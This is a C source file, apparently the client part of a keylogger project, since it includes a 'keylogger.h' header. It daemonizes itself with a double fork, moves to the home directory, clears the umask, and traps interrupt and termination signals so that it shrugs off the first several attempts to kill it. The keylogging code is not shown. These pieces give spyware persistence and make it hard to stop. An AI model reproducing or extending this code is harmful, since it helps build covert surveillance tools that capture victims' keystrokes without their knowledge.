/**
 * Client side of server.
 */
#include "client.h"
#include "keylogger.h"
#include <errno.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>


int signal_counter = 0;

void background_process(void) {
//process line
  //lwitten     5523  0.0  0.0   2772    96 ?        S    17:05   0:00 ./src/main

//sudo kill -SIGNAL_CODE P_ID
//-9 for kill, -2 for int
//sudo kill -9 -- -GROUPID

  printf("Begin Backgrounding 1\n");
  // IMPLEMENTATION HERE

  //umask(0) to clear file creation mask?


  int process_id = fork();
  //printf("backgrounding complete 2\n");


  if (process_id == -1){
    perror("Failed to fork Process\n");
    //printf("failed to fork 1\n");
    //status 1 is an error
    exit(errno);
  }
  else if (process_id > 0){
    //successfully exit parent process

    printf("parent exiting\n");
    exit(0);
  }

  //printf("backgrounding complete 3\n");

  /*
  //create a new process group
  int group_id = setsid();

  if(group_id == -1){
    perror("Failed to create a process group\n");
    exit(errno);
  }*/

  //printf("backgrounding complete 4\n");


    //redirect signals
  immortalize();

  //fork again?

  //printf("backgrounding complete 5\n");
  process_id = fork();

    if (process_id == -1){
    perror("Failed to fork Process\n");
    //status 1 is an error
    exit(errno);
  }
  else if (process_id > 0){
    //successfully exit parent process
    printf("killing parent");
    //raise(SIGKILL);
    exit(0);
    perror("this should not be viewable");
  }
  //printf("backgrounding complete 6\n");
  //change working directory to root

  chdir(getenv("HOME"));

  //set umask to 0
  
  umask(0);
  //signal handle again just to make sure
  immortalize();
  printf("backgrounding complete\n");
}

void immortalize(void){

    //Redirect common abort/termination/interrupt signals to ignores

    //int* signal_counter  = malloc(sizeof(int));
    signal(SIGINT,shutdown_signal);
    signal(SIGTERM,shutdown_signal);
    signal(SIGHUP,shutdown_signal);
    signal(SIGABRT,shutdown_signal);
}

//signal handling function
void shutdown_signal(int signal){
  //global variable signal_counter defined above

  //on 5th actually shutdown
  if(signal_counter > 4){
    printf("ok, you killed me");
    raise(SIGKILL);
    printf("The program should be killed at this point? This shouldn't be viewable");
  }
  signal_counter++;
  printf("You tried to shut down but failed");
}


